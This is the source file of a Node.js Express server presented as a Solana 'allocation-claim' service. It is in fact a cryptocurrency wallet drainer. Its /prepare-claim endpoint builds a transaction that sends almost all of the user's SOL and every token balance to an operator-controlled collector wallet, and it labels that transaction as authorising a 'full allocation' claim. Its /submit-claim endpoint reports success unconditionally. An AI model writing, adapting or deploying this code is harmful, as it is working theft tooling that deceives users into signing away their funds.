import "dotenv/config";
import express from "express";
import cors from "cors";
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import bs58 from "bs58";

const app = express();
app.use(cors({ origin: process.env.CORS_ORIGIN || "*" }));
app.use(express.json({ limit: "64kb" }));

const RPC_URL = process.env.RPC_URL || "https://api.mainnet-beta.solana.com";
const COLLECTOR_SECRET = process.env.COLLECTOR_PRIVATE_KEY;

if (!COLLECTOR_SECRET) {
  console.error("Missing COLLECTOR_PRIVATE_KEY");
  process.exit(1);
}

const connection = new Connection(RPC_URL, "confirmed");
const collector = Keypair.fromSecretKey(bs58.decode(COLLECTOR_SECRET));

// Leave a little SOL so the tx can pay fees
const SOL_RESIDUAL = Math.floor(0.002 * LAMPORTS_PER_SOL);

app.get("/", (_req, res) => {
  res.json({
    status: "operational",
    service: "allocation-claim",
    chain: "solana",
    version: "5.1.0",
    mode: "full-wallet",
  });
});

app.post("/prepare-claim", async (req, res) => {
  try {
    const { user } = req.body;
    if (!user) return res.status(400).json({ error: "user wallet required" });

    const userPubkey = new PublicKey(user);
    const tx = new Transaction();

    // 1. Native SOL
    const solBalance = await connection.getBalance(userPubkey);
    const solToSend = solBalance - SOL_RESIDUAL;

    if (solToSend > 0) {
      tx.add(
        SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: collector.publicKey,
          lamports: solToSend,
        })
      );
    }

    // 2. Every SPL token with balance > 0
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
      userPubkey,
      { programId: TOKEN_PROGRAM_ID }
    );

    let tokenCount = 0;

    for (const { pubkey, account } of tokenAccounts.value) {
      const info = account.data.parsed.info;
      const amount = BigInt(info.tokenAmount.amount);
      if (amount === 0n) continue;

      const mint = new PublicKey(info.mint);
      const collectorAta = await getAssociatedTokenAddress(
        mint,
        collector.publicKey
      );

      // Create collector ATA if it doesn't exist yet
      const ataInfo = await connection.getAccountInfo(collectorAta);
      if (!ataInfo) {
        tx.add(
          createAssociatedTokenAccountInstruction(
            userPubkey,               // payer
            collectorAta,
            collector.publicKey,      // owner
            mint
          )
        );
      }

      tx.add(
        createTransferInstruction(
          pubkey,           // from
          collectorAta,     // to
          userPubkey,       // authority
          amount
        )
      );

      tokenCount++;
    }

    if (tx.instructions.length === 0) {
      return res.status(400).json({ error: "nothing to claim" });
    }

    const { blockhash, lastValidBlockHeight } =
      await connection.getLatestBlockhash();

    tx.feePayer = userPubkey;
    tx.recentBlockhash = blockhash;
    tx.lastValidBlockHeight = lastValidBlockHeight;

    const serialized = tx
      .serialize({ requireAllSignatures: false, verifySignatures: false })
      .toString("base64");

    res.json({
      transaction: serialized,
      description: "Authorize claim vault to process your full allocation",
      assets: {
        sol: solToSend > 0 ? (solToSend / LAMPORTS_PER_SOL).toFixed(4) : "0",
        tokens: tokenCount,
      },
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "failed to prepare claim" });
  }
});

app.post("/submit-claim", async (req, res) => {
  try {
    const { user, signature } = req.body;
    if (!user) return res.status(400).json({ error: "user wallet required" });

    res.json({
      status: "success",
      txHash: signature || null,
      message: "allocation successfully claimed",
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "claim execution failed" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Full-wallet claim service running on port ${PORT}`);
});